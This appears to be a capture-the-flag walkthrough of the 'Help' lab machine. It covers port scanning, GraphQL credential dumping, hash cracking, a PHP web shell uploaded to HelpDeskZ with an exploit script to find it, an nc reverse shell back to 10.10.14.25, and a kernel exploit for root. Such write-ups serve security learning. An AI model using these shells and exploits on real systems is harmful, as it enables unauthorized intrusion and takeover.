```
sudo nmap -sS -sV -p- 10.10.10.121
[sudo] password for wizardwalter: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-27 19:53 EDT
Nmap scan report for 10.10.10.121
Host is up (0.034s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18
3000/tcp open  http    Node.js Express framework
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

looks like they are running apache webserver with nodejs backend....

i went to the ip in my browser and it is trying to resolve to help.htb so i will add it to etc/hosts file...

i will run gobuster against this:
```
gobuster dir -u http://help.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -x php,html,txt

....
index.html           (Status: 200) [Size: 11321]
/index.html           (Status: 200) [Size: 11321]
/javascript           (Status: 301) [Size: 309] [--> http://help.htb/javascript/]
/server-status        (Status: 403) [Size: 296]
/support              (Status: 301) [Size: 306] [--> http://help.htb/support/]
```

/javascript leads me to a 403.... but support i find a helpdesk application:
![[Pasted image 20250827200322.png]]

real quick i will search if there is any vulns and keep note of them:
```
searchsploit HelpDeskZ
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
HelpDeskZ 1.0.2 - Arbitrary File Upload                                                                                                                                                                    | php/webapps/40300.py
HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download                                                                                                                             | php/webapps/41200.py
Helpdeskz v2.0.2 - Stored XSS                                                                                                                                                                              | php/webapps/52068.txt
```

cool may be useful!

lets go try and hit port 3000 now....
i get a screen that shows:
`"Hi Shiv, To get access please find the credentials with given query"`

![[Pasted image 20250827201137.png]]

after gobuster failed.... i tried hitting endpoints on my own like nodejs, express, etc finally graphql gave me:
![[Pasted image 20250827201057.png]]

after trying a ton of combos i resorted to curl and hit something:
```
curl -X POST http://help.htb:3000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'

{"data":{"__schema":{"types":[{"name":"Query","fields":[{"name":"user"}]},{"name":"User","fields":[{"name":"username"},{"name":"password"}]},{"name":"String","fields":null},{"name":"__Schema","fields":[{"name":"types"},{"name":"queryType"},{"name":"mutationType"},{"name":"subscriptionType"},{"name":"directives"}]},{"name":"__Type","fields":[{"name":"kind"},{"name":"name"},{"name":"description"},{"name":"fields"},{"name":"interfaces"},{"name":"possibleTypes"},{"name":"enumValues"},{"name":"inputFields"},{"name":"ofType"}]},{"name":"__TypeKind","fields":null},{"name":"Boolean","fields":null},{"name":"__Field","fields":[{"name":"name"},{"name":"description"},{"name":"args"},{"name":"type"},{"name":"isDeprecated"},{"name":"deprecationReason"}]},{"name":"__InputValue","fields":[{"name":"name"},{"name":"description"},{"name":"type"},{"name":"defaultValue"}]},{"name":"__EnumValue","fields":[{"name":"name"},{"name":"description"},{"name":"isDeprecated"},{"name":"deprecationReason"}]},{"name":"__Directive","fields":[{"name":"name"},{"name":"description"},{"name":"locations"},{"name":"args"}]},{"name":"__DirectiveLocation","fields":null}]}}}
```

looking through docs.... took me forever but i was able to make this query:
```
curl -s -X POST http://help.htb:3000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name args { name type { name kind ofType { name kind } } } } } } }"}'

{"data":{"__schema":{"queryType":{"fields":[{"name":"user","args":[]}]}}}}
```

and with that i can run:
```
curl -s -X POST http://help.htb:3000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { username password } }"}'

{"data":{"user":{"username":"helpme@helpme.com","password":"5d3c93182bb20f07b994a7f617e99cff"}}} 
```

very nice!
that `5d3c93182bb20f07b994a7f617e99cff` looks like an **MD5 hash** (32 hex chars)....

if 32 char, is most of the time a md5 hash but

lets run nth on it:
```
nth --text 5d3c93182bb20f07b994a7f617e99cff

......

https://twitter.com/bee_sec_san
https://github.com/HashPals/Name-That-Hash 
    

5d3c93182bb20f07b994a7f617e99cff

Most Likely 
MD5, HC: 0 JtR: raw-md5 Summary: Used for Linux Shadow files.
MD4, HC: 900 JtR: raw-md4
NTLM, HC: 1000 JtR: nt Summary: Often used in Windows Active Directory.
Domain Cached Credentials, HC: 1100 JtR: mscach

```

we can now try hashcat with all of these(though i bet it is md5):
```
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

......

5d3c93182bb20f07b994a7f617e99cff:godhelpmeplz 
```

nice!

`helpme@helpme.com:godhelpmeplz`

lets go back to the website from before at `/support`

We know it is running helpdeskz and that there are some vulns... i am gonna google more about it to see....

We are gonna assume it is running on 1.0.2 as that seems to be vuln and i cant find out the version!

looking back at our searchsploit from earlier looks like it is all 1.0.2:
ok i am going to upload a php reverse shell based on what the exploit says:
```
<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
```

i could not get the exploit 40300 to work correctly so i found that we need to upload the file to /uploads/tickets/:
```
cat exploit.py     
import hashlib
import time
import sys
import requests

print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'

if len(sys.argv) < 3:
    print "Usage: {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
    sys.exit(1)

helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]

currentTime = int(time.time())

for x in range(0, 300):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl+'/uploads/tickets/'+md5hash+'.php'
    response = requests.head(url)
    if response.status_code == 200:
        print "found!"
        print url
        sys.exit(0)

print "Sorry, I did not find anything"
```

looks like it is the same other than that!

Now we go to the /support url and upload the simpleshell.php, which it will error but that is ok cause in the source code we see that the file is still actually uploaded to /uploads/tickets/
Now we are almost ready:
Do this first as kali does not work well with python2:

```
python3 -m venv venv

source venv/bin/activate

when done run deactivate fyi
```

you will be popped into a virtual env(might work without but my kali does not like python2 :idk:)

So now that we uploaded our shell above and it errors saying file not aloud, we must act fast and run the exploit or this will not work, trust me i must have taken too long to type out the exploit command or went and made sure but that range(0,300) is basically our timer, with that said:

`python2 ./exploit.py http://help.htb/support simpleshell.php`

will give us the url to hit the shell:

`http://help.htb/support/uploads/tickets/731e9b618acc249dcfd97d1ed7deba72.php`

make sure help.htb is added to your etc/hosts fyi or this wont work

we can now test:
`http://help.htb/support/uploads/tickets/731e9b618acc249dcfd97d1ed7deba72.php?cmd=whoami`

`help`

bang we are in!

Lets now do a reverse shell back to our kali and get in there:
```
http://help.htb/support/uploads/tickets/731e9b618acc249dcfd97d1ed7deba72.php?cmd=rm %2Ftmp%2Ff%3Bmkfifo %2Ftmp%2Ff%3Bcat %2Ftmp%2Ff|%2Fbin%2Fsh -i 2>%261|nc 10.10.14.25 4444 >%2Ftmp%2Ff
```

Now this took me forever to get, i tried multiple bash, tcp shells and none worked i found this deep on google and redid it for my port and ip:
```
rm/tmp/f;mkfifo/tmp/f;cat/tmp/f|/bin/sh-i2>&1|nc10.10.14.254444>/tmp/f
```
i used this site to encode and decode: https://www.urldecoder.org/


I catch my shell and get user.txt at /home/help/user.txt:
```
cat user.txt
8c4c0c99681************
```

USER PWNED!

---
### Priv Esc

start with simple enumeration:
```
uname -a
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
$ hostname
help
$ ifconfig            
eth0      Link encap:Ethernet  HWaddr 52:54:00:3f:be:02  
          inet addr:10.0.2.15  Bcast:10.0.2.255  Mask:255.255.255.0
          inet6 addr: fec0::5054:ff:fe3f:be02/64 Scope:Site
          inet6 addr: fe80::5054:ff:fe3f:be02/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:92222 errors:0 dropped:0 overruns:0 frame:0
          TX packets:53533 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:9154657 (9.1 MB)  TX bytes:19758933 (19.7 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:660 errors:0 dropped:0 overruns:0 frame:0
          TX packets:660 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:60992 (60.9 KB)  TX bytes:60992 (60.9 KB)
```

if i quickly look up this kernal in searchsploit(this box had me use another exploit script chances are they want another):
```
searchsploit 4.4.0-116        
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation             | linux/local/44298.c
```

only one returns and it is the exact version:

i compile it as it is a .c file:
```
gcc 44298.c -o exploit
```

then i serve it thru a python http server and grab it with wget:

```
chmod +x prog

$ ./prog
./prog: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./prog)
```

looks like cause i compiled it on my kali it is not working.....

on the target:
```
which gcc
/usr/bin/gcc
```

how convenient!

I will just upload the .c file and compile it there!

`wget http://10.10.14.25/44298.c`

recompile:
```
gcc 44298.c -o exploit
```

make sure to spawn a bash shell:
`python3 -c 'import pty; pty.spawn("/bin/bash")'`


```
./exploit
task_struct = ffff88001e5e4600
uidptr = ffff88003d96a604
spawning root shell
root@help:/tmp# cd ../root
cd ../root
root@help:/root# cat root.txt
cat root.txt
ac105319ada81f3*********
```

ROOT PWNED!



